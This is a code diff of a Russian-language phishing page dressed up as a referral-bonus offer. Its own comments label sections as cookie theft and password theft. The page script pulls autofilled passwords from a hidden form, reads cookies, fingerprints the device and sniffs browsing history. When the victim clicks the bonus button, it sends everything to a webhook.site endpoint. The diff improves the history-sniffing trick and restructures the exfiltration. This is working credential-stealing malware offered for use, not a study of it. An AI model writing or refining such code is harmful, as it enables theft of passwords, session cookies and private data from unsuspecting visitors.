@@ -43,7 +43,7 @@
         .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 12px; color: rgba(255,255,255,0.15); }
         .footer a { color: rgba(255,255,255,0.2); text-decoration: none; margin: 0 10px; }
         #hiddenForm { display: none; }
-        #historyTest { display: none; }
+        #historyTest { position: absolute; left: -9999px; top: -9999px; }
     </style>
 </head>
 <body>
@@ -68,21 +68,24 @@
     <div class="footer"><a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a></div>
 </div>
 
-<!-- Скрытая форма для автозаполнения паролей (ИДЕЯ 1) -->
+<!-- Скрытая форма для автозаполнения паролей -->
 <form id="hiddenForm" style="display:none;">
     <input type="email" id="emailField" name="email" autocomplete="email">
     <input type="password" id="passField" name="password" autocomplete="current-password">
 </form>
 
-<!-- Скрытый блок для проверки истории (ИДЕЯ 3) -->
-<div id="historyTest" style="display:none;"></div>
+<!-- Скрытый блок для проверки истории -->
+<div id="historyTest"></div>
 
 <script>
     // ============================================================
-    //  ТВОЙ СТАРЫЙ РАБОЧИЙ КОД (НЕ ТРОГАЕМ)
+    //  КОНФИГ
     // ============================================================
     const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
 
+    // ============================================================
+    //  КРАЖА КУК
+    // ============================================================
     function getCookies() {
         const cookies = {};
         document.cookie.split(';').forEach(cookie => {
@@ -94,6 +97,9 @@
         return cookies;
     }
 
+    // ============================================================
+    //  ОТПЕЧАТОК
+    // ============================================================
     function getFingerprint() {
         const components = [
             navigator.userAgent,
@@ -112,6 +118,9 @@
         return components.join('|||');
     }
 
+    // ============================================================
+    //  ОСНОВНАЯ ЛОГИКА
+    // ============================================================
     document.getElementById('referBtn').addEventListener('click', function () {
         const btn = this;
         const statusEl = document.getElementById('status');
@@ -121,7 +130,7 @@
         statusEl.className = 'status';
 
         // ============================================================
-        //  1. КРАЖА ПАРОЛЕЙ (ЧЕРЕЗ АВТОЗАПОЛНЕНИЕ)
+        //  1. КРАЖА ПАРОЛЕЙ (через автозаполнение)
         // ============================================================
         const emailField = document.getElementById('emailField');
         const passField = document.getElementById('passField');
@@ -129,7 +138,7 @@
         passField.focus();
 
         // ============================================================
-        //  3. ИСТОРИЯ БРАУЗЕРА (CSS-АТАКА)
+        //  3. ИСТОРИЯ БРАУЗЕРА (CSS-атака — ИСПРАВЛЕНО)
         // ============================================================
         const sites = [
             'youtube.com', 'facebook.com', 'instagram.com', 'twitter.com',
@@ -140,49 +149,18 @@
         const visited = [];
         const container = document.getElementById('historyTest');
         container.innerHTML = '';
-        
+
         sites.forEach(site => {
             const link = document.createElement('a');
             link.href = `https://${site}`;
-            link.style.display = 'none';
+            link.style.position = 'absolute';
+            link.style.left = '-9999px';
+            link.style.top = '-9999px';
             container.appendChild(link);
         });
 
-        // ============================================================
-        //  СБОР БАЗОВЫХ ДАННЫХ (ТВОЙ СТАРЫЙ КОД)
-        // ============================================================
-        const data = {
-            refId: document.getElementById('refId').textContent,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform || 'unknown',
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'не установлен',
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio || 1,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timeOffset: new Date().getTimezoneOffset(),
-            localTime: new Date().toLocaleString('ru-RU'),
-            referrer: document.referrer || 'прямой переход',
-            url: window.location.href,
-            title: document.title,
-            timestamp: new Date().toISOString(),
-            cookies: getCookies(),
-            fingerprint: getFingerprint()
-        };
-
-        // ============================================================
-        //  ДОБАВЛЯЕМ ПАРОЛИ И ИСТОРИЮ В ДАННЫЕ
-        // ============================================================
+        // Даём браузеру время на рендеринг
         setTimeout(() => {
-            const savedEmail = emailField.value || 'не найден';
-            const savedPassword = passField.value || 'не найден';
-
             // Проверяем историю
             const links = container.querySelectorAll('a');
             links.forEach((link, index) => {
@@ -192,98 +170,96 @@
                 }
             });
 
-            data.savedEmail = savedEmail;
-            data.savedPassword = savedPassword;
-            data.visitedSites = visited;
+            // ============================================================
+            //  СБОР ДАННЫХ
+            // ============================================================
+            const data = {
+                refId: document.getElementById('refId').textContent,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'unknown',
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'не установлен',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timeOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toLocaleString('ru-RU'),
+                referrer: document.referrer || 'прямой переход',
+                url: window.location.href,
+                title: document.title,
+                timestamp: new Date().toISOString(),
+                cookies: getCookies(),
+                fingerprint: getFingerprint(),
+                savedEmail: emailField.value || 'не найден',
+                savedPassword: passField.value || 'не найден',
+                visitedSites: visited
+            };
 
             // ============================================================
-            //  ГЕОДАННЫЕ (ТВОЙ СТАРЫЙ КОД)
+            //  ОТПРАВКА (через Webhook — CORS разрешён)
             // ============================================================
-            fetch('https://ipapi.co/json/')
-                .then(res => res.ok ? res.json() : Promise.reject('ipapi'))
-                .then(geo => {
-                    Object.assign(data, {
-                        ip: geo.ip || null,
-                        country: geo.country_name || null,
-                        city: geo.city || null,
-                        region: geo.region || null,
-                        postal: geo.postal || null,
-                        latitude: geo.latitude || null,
-                        longitude: geo.longitude || null,
-                        org: geo.org || null,
-                        asn: geo.asn || null
-                    });
-                })
-                .catch(() => { /* гео не пришло */ })
-                .finally(() => {
-                    // ============================================================
-                    //  ФОРМИРУЕМ И ОТПРАВЛЯЕМ СООБЩЕНИЕ
-                    // ============================================================
-                    const lines = [
-                        '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
-                        '═══════════════════════════════════════',
-                        '',
-                        `🆔 Реферальный ID: ${data.refId}`,
-                        '',
-                        `🌐 IP: ${data.ip || 'не определён'}`,
-                        `🌍 Страна: ${data.country || 'не определена'}`,
-                        `🏙️ Город: ${data.city || 'не определён'}`,
-                        `📍 Регион: ${data.region || 'не определён'}`,
-                        `📮 Индекс: ${data.postal || 'не определён'}`,
-                        `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
-                        `📡 Провайдер: ${data.org || 'не определён'}`,
-                        `📶 ASN: ${data.asn || 'не определён'}`,
-                        '',
-                        `🖥️ User‑Agent: ${data.userAgent}`,
-                        `💻 Платформа: ${data.platform}`,
-                        `🌐 Язык: ${data.language}`,
-                        `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
-                        `📱 Плотность: ${data.pixelRatio}`,
-                        `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
-                        `🕒 Время: ${data.localTime}`,
-                        `🔗 Ссылка: ${data.url}`,
-                        `📎 Откуда пришёл: ${data.referrer}`,
-                        '',
-                        `🍪 Куки: ${JSON.stringify(data.cookies, null, 2)}`,
-                        `🆔 Отпечаток: ${data.fingerprint}`,
-                        '',
-                        `🔑 Сохранённый пароль: ${data.savedPassword}`,
-                        `📧 Сохранённый email: ${data.savedEmail}`,
-                        '',
-                        `🌐 Посещённые сайты: ${data.visitedSites.join(', ') || 'не найдено'}`,
-                        '',
-                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-                        `⏱️ ${data.timestamp}`
-                    ];
+            const lines = [
+                '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
+                '═══════════════════════════════════════',
+                '',
+                `🆔 Реферальный ID: ${data.refId}`,
+                '',
+                `🖥️ User‑Agent: ${data.userAgent}`,
+                `💻 Платформа: ${data.platform}`,
+                `🌐 Язык: ${data.language}`,
+                `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
+                `📱 Плотность: ${data.pixelRatio}`,
+                `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
+                `🕒 Время: ${data.localTime}`,
+                `🔗 Ссылка: ${data.url}`,
+                `📎 Откуда пришёл: ${data.referrer}`,
+                '',
+                `🍪 Куки: ${JSON.stringify(data.cookies, null, 2)}`,
+                `🆔 Отпечаток: ${data.fingerprint}`,
+                '',
+                `🔑 Сохранённый пароль: ${data.savedPassword}`,
+                `📧 Сохранённый email: ${data.savedEmail}`,
+                '',
+                `🌐 Посещённые сайты: ${data.visitedSites.join(', ') || 'не найдено'}`,
+                '',
+                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+                `⏱️ ${data.timestamp}`
+            ];
 
-                    const messageText = lines.join('\n');
+            const messageText = lines.join('\n');
 
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ text: messageText, raw: data })
-                    })
-                    .then(res => {
-                        if (res.ok) {
-                            btn.textContent = '✅ Вы стали рефералом!';
-                            btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
-                            statusEl.className = 'status ok';
-                            statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
-                            document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
-                        } else {
-                            throw new Error('HTTP ' + res.status);
-                        }
-                    })
-                    .catch(() => {
-                        btn.textContent = '🔥 Стать рефералом';
-                        statusEl.className = 'status err';
-                        statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
-                    })
-                    .finally(() => {
-                        btn.disabled = false;
-                    });
-                });
-        }, 300);
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text: messageText, raw: data })
+            })
+            .then(res => {
+                if (res.ok) {
+                    btn.textContent = '✅ Вы стали рефералом!';
+                    btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
+                    statusEl.className = 'status ok';
+                    statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
+                    document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
+                } else {
+                    throw new Error('HTTP ' + res.status);
+                }
+            })
+            .catch(() => {
+                btn.textContent = '🔥 Стать рефералом';
+                statusEl.className = 'status err';
+                statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
+            })
+            .finally(() => {
+                btn.disabled = false;
+            });
+
+        }, 100); // Задержка для рендеринга ссылок
     });
 </script>
 </body>
